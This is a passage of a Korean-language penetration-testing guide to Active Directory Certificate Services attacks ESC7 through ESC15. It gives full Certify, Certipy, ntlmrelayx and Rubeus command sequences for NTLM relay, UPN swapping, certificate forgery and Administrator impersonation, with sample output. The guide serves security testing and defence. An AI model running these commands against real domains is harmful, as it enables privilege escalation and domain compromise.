요약하면, 이전까지 ESC7에서 “권한이 더 낮은” 쪽으로 여겨졌던 *Manage Certificates* 권한만으로도 CA 설정을 건드리거나 더 제한적인 *Manage CA* 권한을 얻을 필요 없이 완전한 권한 상승이나 장기 persistence를 달성할 수 있습니다.

#### Certify 2.0으로 primitive 악용하기

1. **보류 상태로 남을 certificate 요청을 제출합니다.** manager approval이 필요한 template을 사용하면 이를 강제할 수 있습니다.
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **새 `manage-ca` 명령을 사용해 대기 중인 요청에 사용자 지정 확장을 추가합니다**:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *템플릿에 *Certificate Issuance Policies* 확장이 이미 정의되어 있지 않다면, 위 값은 발급 후에도 유지됩니다.*

3. **요청을 발급**하거나 (사용자 역할에 *Manage Certificates* 승인 권한도 있는 경우) 운영자가 승인할 때까지 기다립니다. 발급되면 인증서를 다운로드합니다:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. 결과 인증서에는 이제 악의적인 issuance-policy OID가 포함되어 있으며, 후속 공격(예: ESC13, 도메인 권한 상승 등)에 사용할 수 있습니다.

> 참고: Certipy ≥ 4.7에서는 `ca` 명령과 `-set-extension` 파라미터를 통해 동일한 공격을 수행할 수 있습니다.

## AD CS HTTP Endpoint로 NTLM Relay – ESC8

### 설명

> [!TIP]
> **AD CS가 설치된** 환경에 취약한 **웹 등록 endpoint**가 존재하고, **도메인 컴퓨터 등록 및 클라이언트 인증을 허용하는 게시된 인증서 템플릿**(기본 제공되는 **`Machine`** 템플릿 등)이 하나 이상 있으면, 스풀러 서비스가 활성화된 **모든 컴퓨터를 공격자가 침해할 수 있습니다**!

AD CS는 관리자가 설치할 수 있는 추가 서버 역할을 통해 여러 **HTTP 기반 등록 방식**을 지원합니다. HTTP 기반 인증서 등록 인터페이스는 **NTLM relay 공격**에 취약합니다. 공격자는 **침해된 머신에서 인바운드 NTLM을 통해 인증하는 모든 AD 계정을 가장할 수 있습니다**. 피해자 계정을 가장한 상태에서 공격자는 이러한 웹 인터페이스에 접근하여 `User` 또는 `Machine` 인증서 템플릿을 사용해 클라이언트 인증 인증서를 **요청할 수 있습니다**.

- **웹 등록 인터페이스**(구형 ASP 애플리케이션으로, `http://<caserver>/certsrv/`에서 제공됨)는 기본적으로 HTTP만 사용하므로 NTLM relay 공격에 대한 보호 기능이 없습니다. 또한 Authorization HTTP 헤더를 통한 NTLM 인증만 명시적으로 허용하므로 Kerberos와 같은 더 안전한 인증 방식을 사용할 수 없습니다.
- **Certificate Enrollment Service**(CES), **Certificate Enrollment Policy**(CEP) Web Service, **Network Device Enrollment Service**(NDES)는 기본적으로 Authorization HTTP 헤더를 통한 negotiate 인증을 지원합니다. negotiate 인증은 Kerberos와 **NTLM을 모두 지원**하므로 공격자는 relay 공격 중에 NTLM 인증으로 **다운그레이드할 수 있습니다**. 이러한 웹 서비스는 기본적으로 HTTPS를 활성화하지만, HTTPS만으로는 **NTLM relay 공격을 방지할 수 없습니다**. HTTPS 서비스에서 NTLM relay 공격을 방지하려면 HTTPS와 channel binding을 함께 사용해야 합니다. 안타깝게도 AD CS는 channel binding에 필요한 IIS의 Extended Protection for Authentication을 활성화하지 않습니다.<sup>[[6]](#references)</sup>

NTLM relay 공격의 일반적인 **문제**는 NTLM 세션의 **지속 시간이 짧고**, **NTLM signing을 요구하는** 서비스와 공격자가 상호작용할 수 없다는 점입니다.

그러나 NTLM relay 공격을 악용해 사용자 인증서를 획득하면 이러한 한계를 극복할 수 있습니다. 세션 지속 시간은 인증서의 유효 기간에 따라 결정되며, 인증서는 **NTLM signing을 요구하는** 서비스에도 사용할 수 있습니다. 탈취한 인증서를 사용하는 방법은 다음을 참조하세요.

{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay 공격의 또 다른 한계는 **공격자가 제어하는 머신에 피해자 계정으로 인증해야 한다는 점**입니다. 공격자는 기다리거나 해당 인증을 **강제로 유도할 수 있습니다**.

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **악용**

[**Certify**](https://github.com/GhostPack/Certify)의 `cas` 명령은 **활성화된 HTTP AD CS endpoint**를 열거합니다.<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 속성은 엔터프라이즈 인증 기관(CA)에서 Certificate Enrollment Service(CES) 엔드포인트를 저장하는 데 사용됩니다. 이 엔드포인트는 **Certutil.exe** 도구를 사용해 파싱하고 나열할 수 있습니다:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify를 이용한 악용

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### [Certipy](https://github.com/ly4k/Certipy)를 이용한 악용

Certipy는 기본적으로 계정 이름이 `$`로 끝나는지에 따라 `Machine` 또는 `User` 템플릿을 사용해 인증서를 요청합니다. 대체 템플릿은 `-template` 매개변수로 지정할 수 있습니다.

그런 다음 [PetitPotam](https://github.com/ly4k/PetitPotam)과 같은 기법을 사용해 인증을 강제할 수 있습니다. 도메인 컨트롤러를 대상으로 할 때는 `-template DomainController`를 지정해야 합니다.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## 보안 확장 없음 - ESC9 <a href="#id-5485" id="id-5485"></a>

### 설명

ESC9라고 하는 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) 값은 **`msPKI-Enrollment-Flag`**에 설정되며, 인증서에서 `szOID_NTDS_CA_SECURITY_EXT` SID 확장을 생략합니다. 과거의 ESC9 예시는 KDC 호환성 동작(`StrongCertificateBindingEnforcement=1`) 또는 별도의 취약한 Schannel 매핑 경로에 의존합니다. 값 `1`은 **현재 기본값이 아니라 과거의 호환성 설정**입니다. Microsoft는 2025년 9월 9일 Windows 보안 업데이트 이후 KDC 재정의 설정이 더 이상 지원되지 않는다고 밝혔습니다. 과거 절차를 적용하기 전에 대상 시스템의 실제 업데이트 상태와 인증 엔드포인트를 확인하세요.<sup>[[7]](#references)</sup> [Microsoft의 배포 지침](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)을 참조하세요.

이 플래그 설정이 중요해지는 조건은 다음과 같습니다.

- 구형 호환 KDC에서는 적용되는 인증서 바인딩 정책이 매핑을 허용해야 합니다. 또는 Schannel 엔드포인트에서 `CertificateMappingMethods` 비트 `0x4`를 통해 UPN 매핑을 별도로 활성화해야 합니다.
- 인증서의 `msPKI-Enrollment-Flag` 설정에 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그가 지정되어 있어야 합니다.
- 인증서에 클라이언트 인증 EKU가 지정되어 있어야 합니다.
- 다른 계정을 침해하려는 계정에 대해 `GenericWrite` 권한이 있어야 합니다.

### 악용 시나리오

`John@corp.local`이 `Jane@corp.local`에 대한 `GenericWrite` 권한을 가지고 있고, `Administrator@corp.local`을 침해하려 한다고 가정해 봅시다. `Jane@corp.local`은 `ESC9` 인증서 템플릿을 사용해 인증서를 등록할 수 있으며, 해당 템플릿의 `msPKI-Enrollment-Flag` 설정에는 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그가 구성되어 있습니다.

먼저 `John`의 `GenericWrite` 권한을 이용해 Shadow Credentials로 `Jane`의 해시를 획득합니다:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

이후 `Jane`의 `userPrincipalName`을 `Administrator`로 수정하면서, 의도적으로 `@corp.local` 도메인 부분은 생략합니다:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

이 수정은 `Administrator@corp.local`이 `Administrator`의 `userPrincipalName`과 여전히 구분되므로 제약 조건을 위반하지 않습니다.

이후 취약한 것으로 표시된 `ESC9` 인증서 템플릿을 `Jane`으로 요청합니다:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

인증서의 `userPrincipalName`이 “object SID” 없이 `Administrator`를 반영하는 것으로 확인됩니다.

그런 다음 `Jane`의 `userPrincipalName`을 원래 값인 `Jane@corp.local`로 되돌립니다:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

발급된 인증서를 사용해 인증을 시도하면 이제 `Administrator@corp.local`의 NT 해시를 얻습니다. 인증서에 도메인 정보가 지정되어 있지 않으므로 명령에 `-domain <domain>`을 포함해야 합니다:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Weak Certificate Mappings - ESC10

### 설명

ESC10에서는 서로 별개의 인증서 매핑 정책 두 가지가 자주 논의됩니다. 관련 인증을 실제로 처리하는 endpoint의 설정을 확인하세요.

- Schannel의 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 아래 `CertificateMappingMethods`는 application server에서 TLS client-certificate 매핑을 제어합니다. UPN 비트는 `0x4`이며, 업데이트된 시스템의 기본값은 `0x18` (`0x8 | 0x10`)입니다.
- KDC의 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 아래 `StrongCertificateBindingEnforcement`는 과거 Kerberos 인증서 바인딩 호환성을 제어했습니다. 값 `1`은 현재의 신뢰할 수 있는 기본값이 아니며, Microsoft는 2025년 9월 9일 Windows 보안 업데이트부터 이 override 지원을 종료했습니다. 이 값만으로 Schannel의 UPN 매핑 상태를 알 수는 없습니다.<sup>[[7]](#references)</sup>

**사례 1**

과거에는 이전 버전 KDC가 `StrongCertificateBindingEnforcement=0`을 따르기도 했습니다. 현재 패치된 시스템에서는 override가 더 이상 지원되지 않으므로 업데이트 수준을 확인하세요.

**사례 2**

Schannel client-certificate endpoint에서 `CertificateMappingMethods`의 UPN 비트(`0x4`)가 활성화된 경우입니다. 이 설정은 KDC의 strong-binding enforcement와 별개이며, 등록 가능한 client-authentication 인증서와 매핑된 계정 속성에 대한 실질적인 제어 권한도 여전히 필요합니다.

### 악용 사례 1

KDC가 여전히 `StrongCertificateBindingEnforcement=0`을 따르는 이전 배포 환경에서는 계정의 `userPrincipalName`을 제어하는 것이 다른 계정으로 이어지는 weak-mapping 경로의 일부가 될 수 있습니다. 필요한 인증서 등록, 매핑, 대상 ID, 그리고 인증 성공 여부는 각각 별도로 확인해야 합니다. `GenericWrite` ACE나 레지스트리 값만으로 계정 탈취가 성립하지는 않습니다.

예를 들어 공격자는 `Jane@corp.local`에 대한 `GenericWrite` 권한을 가지고 있으며, `Administrator@corp.local`을 침해하려고 합니다. 이 절차는 ESC9와 유사하며, 모든 certificate template을 활용할 수 있습니다.

먼저 `GenericWrite`를 악용해 Shadow Credentials를 사용하여 `Jane`의 해시를 가져옵니다.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

그 후 `Jane`의 `userPrincipalName`을 `Administrator`로 변경합니다. 제약 조건 위반을 방지하기 위해 `@corp.local` 부분은 의도적으로 생략합니다.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

이후 기본 `User` 템플릿을 사용해 `Jane`으로 클라이언트 인증을 허용하는 인증서를 요청합니다.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`의 `userPrincipalName`은 이후 원래 값인 `Jane@corp.local`로 되돌려집니다.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

획득한 인증서로 인증하면 `Administrator@corp.local`의 NT hash를 얻을 수 있습니다. 인증서에 도메인 정보가 없으므로 명령어에 도메인을 지정해야 합니다.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### 악용 사례 2

`CertificateMappingMethods`에 `UPN` 비트 플래그(`0x4`)가 포함되어 있으면, `GenericWrite` 권한을 가진 계정 A는 `userPrincipalName` 속성이 없는 모든 계정 B를 침해할 수 있습니다. 여기에는 머신 계정과 기본 제공 도메인 관리자 계정인 `Administrator`도 포함됩니다.

이 경우 목표는 `GenericWrite`를 활용해 Shadow Credentials를 통해 먼저 `Jane`의 해시를 얻고, `DC$@corp.local`을 침해하는 것입니다.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

그런 다음 `Jane`의 `userPrincipalName`이 `DC$@corp.local`로 설정됩니다.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

기본 `User` 템플릿을 사용해 `Jane`이라는 이름으로 클라이언트 인증용 인증서를 요청합니다.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`의 `userPrincipalName`은 이 과정 후 원래 값으로 되돌아갑니다.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Schannel을 통해 인증하기 위해 Certipy의 `-ldap-shell` 옵션을 사용하며, 인증 성공은 `u:CORP\DC$`로 표시됩니다.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

LDAP shell을 통해 `set_rbcd`와 같은 명령을 사용하면 Resource-Based Constrained Delegation (RBCD) 공격을 수행해 도메인 컨트롤러를 장악할 수 있습니다.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

이 취약점은 `userPrincipalName`이 없거나 `sAMAccountName`과 일치하지 않는 모든 사용자 계정에도 적용됩니다. 기본적으로 `userPrincipalName`이 없고 LDAP 권한이 높은 `Administrator@corp.local` 계정은 주요 공격 대상입니다.

## Relaying NTLM to ICPR - ESC11

### Explanation

CA Server에 `IF_ENFORCEENCRYPTICERTREQUEST`가 설정되어 있지 않으면 RPC service를 통해 signing 없이 NTLM relay 공격을 수행할 수 있습니다. [자세한 내용은 여기에서 확인하세요](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`certipy`를 사용해 `Enforce Encryption for Requests`가 Disabled인지 열거할 수 있으며, certipy는 `ESC11` 취약점을 표시합니다.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### 악용 시나리오

릴레이 서버를 설정해야 합니다:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

참고: domain controller의 경우 DomainController에서 `-template`을 지정해야 합니다.

또는 [sploutchy의 impacket fork](https://github.com/sploutchy/impacket)를 사용할 수 있습니다:

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## ADCS CA에 대한 YubiHSM을 통한 Shell access - ESC12

### 설명

관리자는 Certificate Authority가 인증서를 "Yubico YubiHSM2"와 같은 외부 장치에 저장하도록 설정할 수 있습니다.

USB 장치가 USB 포트를 통해 CA 서버에 연결되어 있거나, CA 서버가 가상 머신인 경우 USB device server를 통해 연결되어 있다면, YubiHSM에서 키를 생성하고 사용하려면 인증 키(때때로 "password"라고도 함)가 필요합니다.

이 키/password는 레지스트리의 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`에 평문으로 저장됩니다.

참조: [여기](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### 악용 시나리오

Shell access를 획득했을 때 CA의 private key가 물리적인 USB 장치에 저장되어 있다면, 키를 복구할 수 있습니다.

먼저 CA certificate(공개 정보)를 확보한 다음:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

마지막으로 certutil `-sign` 명령을 사용해 CA 인증서와 해당 개인 키로 임의의 새 인증서를 위조합니다.

## OID Group Link Abuse - ESC13

### 설명

`msPKI-Certificate-Policy` 특성을 사용하면 인증서 템플릿에 발급 정책을 추가할 수 있습니다. 발급 정책을 담당하는 `msPKI-Enterprise-Oid` 객체는 PKI OID 컨테이너의 Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services)에서 찾을 수 있습니다. 정책은 이 객체의 `msDS-OIDToGroupLink` 특성을 사용해 AD 그룹에 연결할 수 있으며, 이를 통해 인증서를 제시한 사용자를 해당 그룹의 구성원인 것처럼 시스템에서 인증할 수 있습니다. [여기의 참고 자료](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

즉, 사용자에게 인증서를 등록할 권한이 있고 해당 인증서가 OID 그룹에 연결되어 있으면, 사용자는 해당 그룹의 권한을 상속할 수 있습니다.

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1)을 사용해 OIDToGroupLink를 찾습니다:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### 악용 시나리오

`certipy find` 또는 `Certify.exe find /showAllPermissions`를 사용해 사용자 권한을 찾습니다.

`John`에게 `VulnerableTemplate`에 등록할 권한이 있으면, 해당 사용자는 `VulnerableGroup` 그룹의 권한을 상속할 수 있습니다.

템플릿만 지정하면 됩니다. 그러면 OIDToGroupLink 권한이 있는 인증서를 받게 됩니다.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Explicit Certificate Mapping Abuse — ESC14

### 설명

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping의 설명은 매우 상세합니다. 아래는 원문을 인용한 내용입니다.<sup>[[14]](#references)</sup>

ESC14는 주로 Active Directory 사용자 또는 컴퓨터 계정의 `altSecurityIdentities` attribute를 오용하거나 안전하지 않게 구성하여 발생하는 "weak explicit certificate mapping" 취약점을 다룹니다. 이 다중 값 attribute를 사용하면 관리자가 인증 목적으로 X.509 certificate를 AD 계정에 수동으로 연결할 수 있습니다. 이 명시적 매핑이 설정되면, 일반적으로 certificate의 SAN에 포함된 UPN 또는 DNS 이름이나 `szOID_NTDS_CA_SECURITY_EXT` security extension에 포함된 SID를 사용하는 기본 certificate 매핑 로직을 재정의할 수 있습니다.

`altSecurityIdentities` attribute에서 certificate를 식별하는 데 사용하는 문자열 값의 범위가 지나치게 넓거나, 쉽게 추측할 수 있거나, 고유하지 않은 certificate 필드에 의존하거나, 쉽게 위조할 수 있는 certificate 구성 요소를 사용하는 경우 매핑은 "weak"합니다. 공격자가 권한 계정에 대해 이렇게 weak하게 정의된 명시적 매핑과 일치하는 attribute를 가진 certificate를 얻거나 제작할 수 있다면, 해당 certificate로 인증하여 그 계정을 사칭할 수 있습니다.

잠재적으로 weak한 `altSecurityIdentities` 매핑 문자열의 예는 다음과 같습니다.

- 일반적인 Subject Common Name (CN)만으로 매핑: 예: `X509:<S>CN=SomeUser`. 공격자는 덜 안전한 출처에서 이 CN이 포함된 certificate를 얻을 수 있습니다.
- 특정 serial number나 subject key identifier와 같은 추가 조건 없이 지나치게 일반적인 Issuer Distinguished Name (DN) 또는 Subject DN 사용: 예: `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- 공격자가 합법적으로 얻거나 위조할 수 있는 certificate에 설정할 수 있는, 그 밖의 예측 가능한 패턴이나 비암호화 식별자 사용 (CA를 침해했거나 ESC1과 같은 취약한 template를 찾은 경우).

`altSecurityIdentities` attribute는 다음과 같은 다양한 매핑 형식을 지원합니다.

- `X509:<I>IssuerDN<S>SubjectDN` (전체 Issuer 및 Subject DN으로 매핑)
- `X509:<SKI>SubjectKeyIdentifier` (certificate의 Subject Key Identifier extension 값으로 매핑)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number로 매핑하며, Issuer DN이 암묵적으로 조건에 포함됨) - 이는 표준 형식이 아니며 일반적으로 `<I>IssuerDN<SR>SerialNumber` 형식입니다.
- `X509:<RFC822>EmailAddress` (SAN의 RFC822 이름, 일반적으로 이메일 주소로 매핑)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate의 raw public key에 대한 SHA1 hash로 매핑 - 일반적으로 강력함)

이러한 매핑의 보안은 매핑에 사용되는 식별자에 따라 달라집니다. Microsoft는 `X509:<RFC822>`를 비롯해 이메일이나 subject 이름을 기반으로 한 매핑을 **weak**으로 분류합니다. Full Enforcement 모드에서는 strong mapping이 없는 certificate가 거부됩니다. 2025년 9월 Windows security update에서는 Compatibility 모드로 되돌아가는 옵션이 제거되었습니다. 따라서 weak mapping만으로는 현재 신뢰할 수 있는 사칭 경로가 되지 않습니다. weak-mapping 시나리오를 평가하기 전에 도메인 컨트롤러의 실제 patch 수준과 certificate 매핑 동작을 확인하세요. `altSecurityIdentities`에 대한 쓰기 권한은 별도로 조사할 만한 단서입니다. 적절한 trusted certificate를 가진 공격자는 유효 권한과 certificate 검증 조건에 따라 **strong** explicit mapping을 추가할 수 있습니다. [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) 및 [ESC14 연구](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)를 참고하세요.

certificate 자체는 유효하더라도, 비활성화된 대상 계정이나 만료된 password로 인해 로그인이 실패할 수 있으므로 certificate 인증 실패의 원인도 진단해야 합니다.

### Abuse 시나리오

ESC14는 Active Directory (AD)의 **explicit certificate mapping**, 특히 `altSecurityIdentities` attribute를 대상으로 합니다. 이 attribute가 설정되어 있으면 (의도된 설정이든 잘못된 설정이든) 공격자는 매핑과 일치하는 certificate를 제시하여 계정을 사칭할 수 있습니다.

#### Scenario A: 공격자가 `altSecurityIdentities`에 쓸 수 있음

 **전제 조건**: 공격자에게 대상 계정의 `altSecurityIdentities` attribute에 대한 쓰기 권한이 있거나, 대상 AD object에 다음 권한 중 하나를 부여할 권한이 있음:  
- `altSecurityIdentities`에 대한 Write property  
- `Public-Information`에 대한 Write property  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Scenario B: 대상에 X509RFC822 (Email)을 통한 weak mapping이 있음

- **과거/조건부 전제 조건**: 대상의 `altSecurityIdentities`에 weak X509RFC822 mapping이 있고, 공격자가 enrollee의 `mail` attribute를 수정할 수 있으며, 적절한 template가 충돌하는 SID binding 없이 해당 이메일을 client-authentication certificate에 포함해야 합니다. 인증이 성공하려면 weak mapping을 여전히 허용하는 환경이어야 합니다. Full Enforcement는 weak mapping만 있는 certificate를 거부합니다. `mail` attribute에 쓸 수 있다는 사실만으로는 단서에 불과합니다.
#### Scenario C: 대상에 X509IssuerSubject mapping이 있음

- **전제 조건**: 대상의 `altSecurityIdentities`에 weak X509IssuerSubject explicit mapping이 있음. 공격자는 피해 principal의 `cn` 또는 `dNSHostName` attribute를 설정해 대상의 X509IssuerSubject mapping subject와 일치시킬 수 있습니다. 그러면 공격자는 피해자 자격으로 certificate를 등록한 뒤, 해당 certificate를 사용해 대상으로 인증할 수 있습니다.
#### Scenario D: 대상에 X509SubjectOnly mapping이 있음

- **전제 조건**: 대상의 `altSecurityIdentities`에 weak X509SubjectOnly explicit mapping이 있음. 공격자는 피해 principal의 `cn` 또는 `dNSHostName` attribute를 설정해 대상의 X509SubjectOnly mapping subject와 일치시킬 수 있습니다. 그러면 공격자는 피해자 자격으로 certificate를 등록한 뒤, 해당 certificate를 사용해 대상으로 인증할 수 있습니다.
### 구체적인 작업
#### Scenario A

certificate template `Machine`의 certificate 요청하기

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 인증서 저장 및 변환

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 인증(인증서를 사용하여)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

정리 (선택 사항)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

다양한 공격 시나리오에서 사용할 수 있는 더 구체적인 공격 방법은 다음을 참조하세요: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explanation

[ESC15 원본 연구](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)에서는 V1 template에 대한 요청에 포함된 application policy가 **패치되지 않은 issuing CA**에 설정된 Extended Key Usage를 어떻게 덮어쓸 수 있는지 설명합니다.<sup>[[15]](#references)</sup> 또한 대상에는 필요한 subject/request 속성을 허용하고, 발급을 차단하는 승인 또는 서명 절차가 없는 게시된 enrollable template이 있어야 합니다. Enrollment 권한만으로는 악용 가능성이 입증되지 않습니다. Certificate Request Agent 사용에는 적합한 두 번째 template과 enrollment-agent 제한이 추가로 필요할 수 있습니다. 해당 경로를 주장하기 전에 CA의 패치 상태와 발급 결과를 확인하세요.

### Abuse

[Certipy 권한 상승 문서](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)에 더 자세한 사용 예제가 있습니다.<sup>[[14]](#references)</sup>


Certipy의 `find` 명령을 사용하면 CA가 패치되지 않은 경우 ESC15에 취약할 가능성이 있는 V1 template을 식별할 수 있습니다.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### 시나리오 A: Schannel을 통한 직접 Impersonation

**1단계: "Client Authentication" Application Policy와 대상 UPN을 주입해 인증서를 요청합니다.** 공격자 `attacker@corp.local`은 등록자가 Subject를 지정할 수 있는 "WebServer" V1 template을 사용해 `administrator@corp.local`을 대상으로 합니다.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: "Enrollee supplies subject"가 설정된 취약한 V1 템플릿입니다.
